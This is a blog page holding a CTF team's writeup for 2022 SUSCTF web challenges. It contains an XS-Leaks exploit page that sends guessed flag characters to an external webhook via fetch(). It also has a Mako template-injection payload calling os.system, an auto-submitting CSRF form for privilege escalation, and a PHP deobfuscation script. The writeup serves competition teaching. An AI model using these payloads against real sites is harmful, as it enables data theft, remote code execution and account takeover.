<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>2022 SUSCTF SU Writeup - su-team</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="su-team"><meta name="msapplication-TileImage" content="/img/SU4.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="su-team"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="本次2022 SUSCTF 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)以下是我们 SU 本次 2022 SUSCTF的 writeup"><meta property="og:type" content="blog"><meta property="og:title" content="2022 SUSCTF SU Writeup"><meta property="og:url" content="https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/"><meta property="og:site_name" content="su-team"><meta property="og:description" content="本次2022 SUSCTF 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)以下是我们 SU 本次 2022 SUSCTF的 writeup"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005625955.jpg"><meta property="og:image" content="https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626061.jpg"><meta property="og:image" content="https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626302.jpg"><meta property="og:image" content="https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626167.jpg"><meta property="og:image" content="https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626003.jpg"><meta property="og:image" content="https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626383.jpg"><meta property="og:image" content="https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626207.jpg"><meta property="og:image" content="https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626343.jpg"><meta property="og:image" content="https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626084.jpg"><meta property="og:image" content="https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626248.jpg"><meta property="og:image" content="https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626629.jpg"><meta property="og:image" content="https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626083.jpg"><meta property="og:image" content="https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626448.jpg"><meta property="og:image" content="https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626545.jpg"><meta property="og:image" content="https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626508.jpg"><meta property="article:published_time" content="2022-02-28T16:59:38.000Z"><meta property="article:modified_time" content="2025-06-03T13:47:15.568Z"><meta property="article:author" content="SUers"><meta property="article:tag" content="SUSCTF"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005625955.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/"},"headline":"2022 SUSCTF SU Writeup","image":["https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005625955.jpg","https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626061.jpg","https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626302.jpg","https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626167.jpg","https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626003.jpg","https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626383.jpg","https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626207.jpg","https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626343.jpg","https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626084.jpg","https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626248.jpg","https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626629.jpg","https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626083.jpg","https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626448.jpg","https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626545.jpg","https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/20220301005626508.jpg"],"datePublished":"2022-02-28T16:59:38.000Z","dateModified":"2025-06-03T13:47:15.568Z","author":{"@type":"Person","name":"SUers"},"publisher":{"@type":"Organization","name":"su-team","logo":{"@type":"ImageObject","url":"https://team-su.github.io/img/SU4.jpg"}},"description":"本次2022 SUSCTF 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)以下是我们 SU 本次 2022 SUSCTF的 writeup"}</script><link rel="canonical" href="https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/"><link rel="alternate" href="/atom.xml" title="su-team" type="application/atom+xml"><link rel="icon" href="/img/SU4.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/members">Members</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="RSS Feed" href="/atom.xml"><i class="fas fa-rss"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-02-28T16:59:38.000Z" title="2022/3/1 00:59:38">2022-03-01</time></span><span class="level-item">Updated&nbsp;<time dateTime="2025-06-03T13:47:15.568Z" title="2025/6/3 21:47:15">2025-06-03</time></span><span class="level-item">an hour read (About 12108 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">2022 SUSCTF SU Writeup</h1><div class="content"><p>本次2022 SUSCTF 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:&#115;&#x75;&#x65;&#114;&#x73;&#x5f;&#120;&#99;&#116;&#102;&#64;&#49;&#50;&#54;&#x2e;&#99;&#111;&#109;">suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)<br>以下是我们 SU 本次 2022 SUSCTF的 writeup </p>
<span id="more"></span>
<hr>
<p>本次2022 SUSCTF 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:&#x73;&#x75;&#x65;&#114;&#x73;&#95;&#120;&#99;&#116;&#x66;&#64;&#49;&#50;&#54;&#46;&#99;&#111;&#x6d;">suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)<br>以下是我们 SU 本次 2022 SUSCTF的 writeup </p>
<h1><span id="web">Web</span><a href="#web" class="header-anchor"></a></h1><h2><span id="ez-note">ez_note</span><a href="#ez-note" class="header-anchor"></a></h2><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="params">()</span> =&gt;</span> location = <span class="string">&#x27;&#123;note_page&#125;&#x27;</span>, <span class="number">1000</span>)</span><br></pre></td></tr></table></figure>
<p>典型的跳转类型 XS-Leaks ，直接翻一下 <a href="https://xsleaks.dev/docs/attacks/navigations/">wiki</a> 可以利用 <code>history.length</code> ，通过这个来检测是否发生了重定向</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;robots&quot;</span> <span class="attr">content</span>=<span class="string">&quot;noindex&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> flag = <span class="string">&#x27;SUSCTF&#123;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">function</span> <span class="title function_">send</span>(<span class="params">msg</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;https://webhook.site/bad84752-95a1-45c4-8395-e5577ea1112b?msg=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(msg))</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">function</span> <span class="title function_">trying</span>(<span class="params">keyword</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> win = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://123.60.29.171:10001/search?q=&#x27;</span> + keyword)</span></span><br><span class="line"><span class="language-javascript">          <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            win.<span class="property">location</span> = <span class="string">&#x27;http://e050-220-133-126-220.ngrok.io/non.html&#x27;</span></span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">              <span class="keyword">if</span> (win.<span class="property">history</span>.<span class="property">length</span> === <span class="number">3</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">send</span>(<span class="string">&#x27;success:&#x27;</span> + keyword)</span></span><br><span class="line"><span class="language-javascript">              &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//send(&#x27;fail:&#x27; + keyword)</span></span></span><br><span class="line"><span class="language-javascript">              &#125;</span></span><br><span class="line"><span class="language-javascript">              win.<span class="title function_">close</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;, <span class="number">1000</span>)</span></span><br><span class="line"><span class="language-javascript">          &#125;, <span class="number">1500</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">run</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">send</span>(<span class="string">&#x27;start&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// &#125;abcdefghijklmnopqrstuvwxyz0123456789_</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// &#125;abcdefghijklmnopqrs</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// </span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> chars = <span class="string">&#x27;_abcdefghijklmnopqrstuv&#x27;</span>.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//let chars = &#x27;&#125;wxyz0123456789_&#x27;.split(&#x27;&#x27;)</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span>(<span class="keyword">let</span> char <span class="keyword">of</span> chars) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">const</span> temp = flag + char</span></span><br><span class="line"><span class="language-javascript">          <span class="title function_">trying</span>(temp)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">run</span>()</span></span><br><span class="line"><span class="language-javascript">      &#125;, <span class="number">1000</span>)</span></span><br><span class="line"><span class="language-javascript">      </span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>手动发了几次，就行了<br>（顺便说一下 reCAPTCHA 体验是真不好，不如换一下 gtest 啥的验证码。</p>
<h2><span id="html-practice">HTML practice</span><a href="#html-practice" class="header-anchor"></a></h2><p>提交 % 会导致生成的页面崩溃，fuzz 了一万遍，发现 <code>##</code> 可以让页面为空，猜想是某种语言或者框架的注释符。<br>一段搜索，发现有可能是 mako 框架，尝试使用 mako 框架的循环：</p>
<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% for a in (1,2,3):</span></span><br><span class="line">    <span class="number">1</span></span><br><span class="line"><span class="comment">% endfor</span></span><br></pre></td></tr></table></figure>
<p>发现页面成功渲染了 3 个 1 ，意味着确实执行了我们的循环语句，接着翻文档，发现可以直接调用 <code>os.system</code> ，并且配合参数 <code>name</code> 进行 RCE</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">% for <span class="selector-tag">a</span> in (self<span class="selector-class">.module</span><span class="selector-class">.cache</span><span class="selector-class">.util</span><span class="selector-class">.os</span><span class="selector-class">.system</span>(name),<span class="number">2</span>,<span class="number">3</span>):</span><br><span class="line">    <span class="number">1</span></span><br><span class="line">% endfor</span><br></pre></td></tr></table></figure>
<p>结合题目描述的 <code>./tamplate</code> ，直接尝试创建一个文件发现可行，于是直接将 flag 内容打出来到目录下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /flag &gt; ./template/xxxx.html</span><br></pre></td></tr></table></figure>
<p>访问就是 flag 了</p>
<h2><span id="fxxkcors">fxxkcors</span><a href="#fxxkcors" class="header-anchor"></a></h2><p>简单的 CSRF ，服务没有验证 JSON 的 content-type ，所以直接放一个表单给 admin 访问就可以让我们提升权限了</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">a</span> <span class="attr">action</span>=<span class="string">&quot;http://124.71.205.122:10002/changeapi.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;text/plain&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&#x27;&#123;&quot;username&quot;:&quot;fweewfwef&quot;, &quot;abc&quot;:&quot;&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;123&quot;&#125;&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">      a.submit()</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2><span id="rubbish-maker">rubbish maker</span><a href="#rubbish-maker" class="header-anchor"></a></h2><p>This challange was more rev than web.</p>
<h3><span id="statement">Statement</span><a href="#statement" class="header-anchor"></a></h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I have made some rubbish <span class="keyword">for</span> you,i guess you won’t enjoy it  </span><br><span class="line"><span class="attr">http</span>:<span class="comment">//123.60.67.19/  </span></span><br><span class="line">container restart <span class="keyword">for</span> every <span class="number">2</span> hours</span><br></pre></td></tr></table></figure>
<p>Going to the link gives us:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./code/8ca5c8ec00628042f7028492fdf2986f</span><br><span class="line"></span><br><span class="line">your code at ./code/8ca5c8ec00628042f7028492fdf2986f/index.php</span><br><span class="line"></span><br><span class="line">you can view it at ./code/8ca5c8ec00628042f7028492fdf2986f/index.txt</span><br></pre></td></tr></table></figure>
<p>And downloading <code>index.txt</code> gives us heavily obfuscated php code. This file also changes every two hours so we must write general automated deobfuscator since doing it manually and case by case will be useless after two hours. This writeup is for specific version I got but should be general enough.<br>Here’s my <a href="https://drive.google.com/file/d/1DCKPqSWfD7UpO99rGGY5IzKjmUTYqxrc/view?usp=sharing">index.php</a></p>
<h3><span id="deobfuscation">Deobfuscation</span><a href="#deobfuscation" class="header-anchor"></a></h3><ul>
<li>Observe that there is a big function at the start which is called many times.</li>
<li>We see that the argument that this function takes is xor’d to something constant so first we replace all <code>f(&#123;x&#125;)</code> with <code>f(&#123;x&#125; xor &#123;that constant&#125;)</code> and also replace the xor’s in the function itself. This will get rid of most bad bytes. We must also be careful to do everything as bytes and not uf8 strings.</li>
<li>Then we observe that we can try to call the function with these values and see if result is always same. As it turns out function is only dependent on it’s argument. So we generate php code to call each <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f(&#123;x&#125;)</span><br></pre></td></tr></table></figure>
 and replace the calls with this value everywhere with the resulting value.<ul>
<li>sometimes the value that this function returns is a closure and we use closure dumping code from stackoverflow for that</li>
</ul>
</li>
<li>At this point we can remove the function in the beggining and code would still work</li>
<li>There’s a lot of encodings(rot13, base64, strrev…) so we try to get them replaced as well</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">fb = <span class="built_in">open</span>(<span class="string">&#x27;index.php&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="comment"># print(fb)</span></span><br><span class="line">fn_name = <span class="string">b&#x27;NtjNSJyp&#x27;</span></span><br><span class="line">i=-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">x = <span class="string">b&#x27;NaDKRCAe&#x27;</span></span><br><span class="line"></span><br><span class="line">woah = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">escb</span>(<span class="params">b: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    b = b.replace(<span class="string">b&#x27;\\\\&#x27;</span>, <span class="string">b&#x27;\\&#x27;</span>)</span><br><span class="line">    b = b.replace(<span class="string">b&quot;\\&#x27;&quot;</span>, <span class="string">b&quot;&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line">sv = <span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = fb.find(fn_name, i+<span class="number">1</span>) </span><br><span class="line">    <span class="keyword">if</span> i==-<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">16</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    jl = i+<span class="built_in">len</span>(fn_name)+<span class="number">2</span></span><br><span class="line">    jr = fb.find(<span class="string">b&quot;&#x27;)&quot;</span>, jl)</span><br><span class="line">    <span class="keyword">if</span> jr-jl&lt;<span class="number">8</span>:</span><br><span class="line">        jr = fb.find(<span 